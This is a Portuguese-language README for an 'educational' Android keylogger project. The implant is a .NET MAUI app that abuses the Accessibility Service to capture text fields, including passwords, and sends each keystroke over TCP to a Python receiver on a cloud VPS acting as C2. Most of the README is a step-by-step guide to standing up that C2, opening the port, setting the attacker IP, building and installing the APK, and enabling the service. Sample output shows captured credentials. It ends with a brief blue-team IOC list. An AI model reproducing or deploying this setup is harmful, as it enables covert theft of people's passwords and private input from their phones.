# 📱 AndroidKeyloggerLab — Keylogger via Accessibility Service

> Implementação didática de um keylogger Android via Accessibility Service em .NET MAUI (C#), com servidor de recebimento em Python, para compreensão de técnicas de coleta de dados em dispositivos móveis.

---

> ⚠️ **AVISO LEGAL:** Este repositório existe **exclusivamente para fins educacionais e de pesquisa**. O uso das técnicas e código aqui presentes contra dispositivos sem autorização explícita é crime tipificado na **Lei 12.737/2012 (Lei Carolina Dieckmann)** e no **Art. 154-A do Código Penal Brasileiro**. Use somente em dispositivos próprios ou em ambientes controlados, com permissão documentada.

---

## 📐 Arquitetura

```
┌──────────────────────────┐     TCP — IP Fixo Global (Oracle Cloud)    ┌──────────────────────────┐
│   IMPLANT (Android APK)  │ ─────────────────────────────────────────► │   VPS Oracle Cloud        │
│   MyAccessibilityService │                  Keystrokes                │   recebimento.py          │
│   .NET MAUI / C#         │                                            │   Ubuntu · IP Fixo · SSH  │
└──────────────────────────┘                                            └──────────────────────────┘
         ▲                                                                         │
         │ Accessibility Events                                                    │ keylog.txt
  ┌──────────────┐                                                       ┌─────────────────┐
  │  Dispositivo │                                                       │   Operador       │
  │  Android     │                                                       │   Kali Linux     │
  └──────────────┘                                                       └─────────────────┘
```

---

## 🚀 Funcionalidades

### 🤖 Implant — `MyAccessibilityService.cs` (.NET MAUI / Android)

- **Accessibility Service:** Registra o serviço no Android como `BIND_ACCESSIBILITY_SERVICE`, monitorando eventos de toda a UI do sistema.
- **Captura de eventos:** Intercepta `ViewTextChanged`, `ViewFocused` e `ViewClicked` — cobrindo campos de texto, senhas e interações gerais.
- **Alerta de ativação:** Ao conectar o serviço, envia automaticamente modelo e versão de API do dispositivo ao servidor C2.
- **Exfiltração assíncrona:** Cada keystroke capturado é enviado via TCP em background thread, sem bloquear a UI.
- **Fire-and-forget:** Conexão nova por evento, com timeout de 3 segundos — evita travamentos em redes instáveis.

### 🖥️ Servidor — `recebimento.py` (Python 3)

- Aceita conexões contínuas de múltiplos dispositivos.
- Exibe cada entrada no console com timestamp formatado.
- Persiste todos os logs em `keylog.txt` para análise posterior.
- Shutdown limpo via `Ctrl+C`.

---

## ⚙️ TTPs Mapeadas (MITRE ATT&CK for Mobile)

| Tática              | Técnica                                                    | ID       |
|---------------------|------------------------------------------------------------|----------|
| Collection          | Input Capture: GUI Input Capture                           | T1417    |
| Collection          | Access Notifications                                       | T1517    |
| Discovery           | System Information Discovery                               | T1426    |
| Command & Control   | Application Layer Protocol: Non-Standard Port              | T1571    |
| Exfiltration        | Exfiltration Over C2 Channel                               | T1041    |
| Persistence         | Event Triggered Execution: Accessibility Features (Mobile) | T1626    |

---

## 🛠️ Tecnologias

| Componente      | Stack                                                        |
|-----------------|--------------------------------------------------------------|
| Implant         | C# · .NET MAUI · .NET 10 · Android Accessibility API        |
| Servidor        | Python 3 · `socket` (stdlib)                                 |
| Protocolo       | TCP raw · uma conexão por evento                             |
| Build           | .NET SDK · Android SDK (API 21+)                             |
| Infraestrutura  | Oracle Cloud Free Tier · Ubuntu 22.04 · IP público fixo      |
| Acesso remoto   | SSH · Ed25519 · par de chaves por ambiente                   |

---

## 📁 Estrutura do Projeto

```text
android-keylogger-lab/
├── Platforms/
│   └── Android/
│       ├── Resources/
│       │   └── xml/
│       │       └── accessibility_service_config.xml  # Configuração do serviço
│       ├── AndroidManifest.xml    # Permissões e declaração do serviço
│       ├── MainActivity.cs
│       ├── MainApplication.cs
│       └── MyAccessibilityService.cs  # Lógica principal do keylogger
├── Resources/                     # Assets MAUI (ícones, splash, fontes)
├── Properties/
├── App.xaml / App.xaml.cs
├── AppShell.xaml / AppShell.xaml.cs
├── MainPage.xaml / MainPage.xaml.cs
├── MauiProgram.cs
├── recebimento.py                 # Servidor Python de log
├── teste.csproj                   # Projeto .NET MAUI
├── teste.slnx                     # Solution
└── README.md
```

---

## ☁️ Infraestrutura C2 — Oracle Cloud

O servidor precisa de um **IP fixo e acessível globalmente** para receber os dados do dispositivo Android em qualquer rede. A solução utilizada foi uma VPS na **Oracle Cloud Free Tier** (Always Free).

### 1. Criar a instância na Oracle Cloud

1. Acesse [cloud.oracle.com](https://cloud.oracle.com) e crie uma conta Free Tier.
2. Vá em **Compute → Instances → Create Instance**.
3. Escolha a imagem **Ubuntu 22.04** e shape **VM.Standard.A1.Flex** (Always Free).
4. Na seção **Add SSH keys**, importe sua chave pública.
5. Anote o **IP público** — é o valor que vai em `KALI_IP` no `MyAccessibilityService.cs`.

### 2. Gerar chave SSH (máquina do operador)

```bash
ssh-keygen -t ed25519 -C "keylogger-c2" -f ~/.ssh/keylogger_key
```

### 3. Conectar ao servidor C2

```bash
ssh -i ~/.ssh/keylogger_key ubuntu@<SEU_IP_ORACLE>
```

### 4. Liberar a porta no Security List da Oracle

1. Vá em **Networking → Virtual Cloud Networks → Security Lists**.
2. Adicione uma **Ingress Rule**: Protocol TCP · Source `0.0.0.0/0` · Porta `9001`.

E no firewall do Ubuntu:

```bash
sudo ufw allow 9001/tcp
```

### 5. Rodar o servidor na VPS

```bash
scp -i ~/.ssh/keylogger_key recebimento.py ubuntu@<SEU_IP_ORACLE>:~/
ssh -i ~/.ssh/keylogger_key ubuntu@<SEU_IP_ORACLE>
python3 recebimento.py
# [*] Servidor de log iniciado. Escutando em 0.0.0.0:9001
```

---

## 🧪 Como Usar (Ambiente de Lab)

> ⚠️ Execute **somente** em dispositivo próprio ou emulador de lab.

### 1. Configurar o IP do C2

Em `MyAccessibilityService.cs`, edite:

```csharp
private const string KALI_IP = "<SEU_IP_ORACLE>";
private const int KALI_PORT = 9001;
```

### 2. Compilar e instalar o APK

```bash
dotnet build teste.csproj -f net10.0-android -c Release

# Instalar via ADB no dispositivo/emulador
adb install bin/Release/net10.0-android/com.companyname.teste-Signed.apk
```

### 3. Ativar o Serviço de Acessibilidade no Android

```
Configurações → Acessibilidade → Aplicativos instalados → teste → Ativar
```

### 4. Monitorar os logs no servidor

```bash
# Tempo real no console
python3 recebimento.py

# Ver arquivo de log acumulado
tail -f keylog.txt
```

Exemplo de saída:

```
[*] Conexão recebida de 189.x.x.x:51234
[2025-06-10 14:32:01] [ALERTA] Serviço ativado com sucesso! Dispositivo: Pixel 7 (API: 34)
[2025-06-10 14:32:15] senha123
[2025-06-10 14:32:22] user@email.com
```

---

## 🔍 IOCs para Blue Team / Detecção

- **Permissão:** `BIND_ACCESSIBILITY_SERVICE` declarada em app não-nativo de acessibilidade
- **Rede:** Conexões TCP de saída frequentes e de curta duração para porta não-padrão
- **Comportamento:** App solicitando ativação manual de serviço de acessibilidade
- **APK:** `com.companyname.teste` — bundle ID genérico de template MAUI não renomeado

---

## 👨‍💻 Autor

**Allan Crisanto**
Técnico de TI · Graduado em ADS (Uninter) · Pós-graduando em Cibersegurança Ofensiva — Red Team Operations (FIAP/PosTech)
